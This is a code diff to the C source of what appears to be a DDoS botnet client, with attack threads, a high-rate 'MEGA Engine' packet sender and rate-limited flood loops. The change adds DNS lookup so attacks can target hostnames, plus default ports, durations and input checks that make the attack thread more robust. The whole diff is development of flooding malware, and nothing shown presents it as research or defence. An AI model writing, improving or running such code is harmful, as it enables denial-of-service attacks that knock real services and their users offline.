@@ -1,5 +1,22 @@
 #include "bot.h"
 
+/* Resolve hostname or IP to in_addr (DNS lookup if needed) */
+static int resolve_target(const char *host, struct in_addr *out)
+{
+    memset(out, 0, sizeof(*out));
+    /* Try numeric IP first (fast path) */
+    if (inet_pton(AF_INET, host, out) == 1) return 0;
+    /* Fallback: DNS resolution */
+    struct addrinfo hints = {0}, *res = NULL;
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_DGRAM;
+    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
+    struct sockaddr_in *sa = (struct sockaddr_in *)res->ai_addr;
+    *out = sa->sin_addr;
+    freeaddrinfo(res);
+    return 0;
+}
+
 /* ── MEGA Engine (sendmmsg + mmap ring) ─────────────── */
 typedef struct {
     int *socks;
@@ -448,7 +465,12 @@ void mixed(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
 void *bg_attack_thread(void *arg)
 {
     BgAttackCtx *ctx = (BgAttackCtx *)arg;
+    if (!ctx) return NULL;
     AttackParams *atk = &ctx->atk;
+    if (atk->duration_secs <= 0) atk->duration_secs = 60;
+    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
+    if (!atk->target[0]) { free(ctx); return NULL; }
+
     time_t deadline = time(NULL) + atk->duration_secs;
     g_attack_active = 1;
     g_attack_stop = 0;
@@ -472,7 +494,9 @@ void *bg_attack_thread(void *arg)
         memset(&ta, 0, sizeof(ta));
         ta.sin_family = AF_INET;
         ta.sin_port = htons((uint16_t)atk->port);
-        inet_pton(AF_INET, atk->target, &ta.sin_addr);
+        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
+            g_attack_active = 0; free(ctx); return NULL;
+        }
         pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
         MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
         if (!tids || !mt) {
@@ -504,7 +528,9 @@ void *bg_attack_thread(void *arg)
         memset(&ta, 0, sizeof(ta));
         ta.sin_family = AF_INET;
         ta.sin_port = htons((uint16_t)atk->port);
-        inet_pton(AF_INET, atk->target, &ta.sin_addr);
+        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
+            g_attack_active = 0; free(ctx); return NULL;
+        }
         TokenBucket tb;
         tb_init(&tb, atk->max_pps, atk->max_pps * 2.0);
         int nc = (int)atk->max_threads;
